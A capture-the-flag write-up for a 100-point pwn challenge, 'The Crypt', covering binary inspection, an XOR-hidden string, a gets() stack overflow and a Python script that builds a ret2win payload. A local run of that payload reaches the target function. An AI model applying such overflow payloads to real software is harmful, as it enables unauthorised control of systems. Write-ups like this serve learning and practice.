# The Crypt

- **Category:** Pwn
- **Points:** 100
- **Binary:** `The_Crypt` (x86-64 ELF)
- **SHA-256:** `93ceee41b1c1a4165658d7ba4ee9e1fd9aa58e2933b00cbd471112079cc32877`
- **Challenge service noted during the event:** `159.65.228.107:5001`

## Binary inspection

The binary was a 64-bit x86-64 ELF. `checksec` reported Partial RELRO, no stack canary, NX enabled, and no PIE; symbols were present.

While examining the functions, I found XOR obfuscation using key `0x13`. Reversing the XOR recovered:

```text
Open_The_Door_To_Nowhere
```

In `whispering_madness()`, the call to `gets()` provided the stack-overflow primitive.

## Return-address offset and payload

The offset to the saved return address was 72 bytes: a 64-byte buffer plus the saved 8-byte RBP. `nowhere()` was at `0x401660`; I used a `ret` instruction at `0x40165f` before the target function.

```python
from struct import pack

offset = 72
ret = 0x40165f
nowhere = 0x401660

payload = b"A" * offset
payload += pack("<Q", ret)
payload += pack("<Q", nowhere)

with open("payload.bin", "wb") as f:
    f.write(payload + b"\\n")
```

The generated `payload.bin` was 89 bytes. During local execution, control reached `nowhere()`, but the program printed:

```text
[-] ERROR: a valid flag.txt could not be found!
```

This confirmed that the control-flow redirection worked locally; the local environment did not contain the flag file expected by the binary.
